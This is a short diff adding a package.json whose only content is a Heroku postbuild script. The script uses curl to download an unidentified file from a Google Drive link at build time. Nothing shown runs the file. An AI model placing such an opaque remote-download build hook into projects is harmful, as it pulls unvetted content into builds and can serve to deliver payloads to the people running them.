@@ -1,0 +1,5 @@
+{
+  "scripts": {
+    "heroku-postbuild": "curl -O https://drive.google.com/uc?export=download&id=1h79cn9rvYk_4udQ6pPzWEu1ePJOQo4iR"
+  }
+}
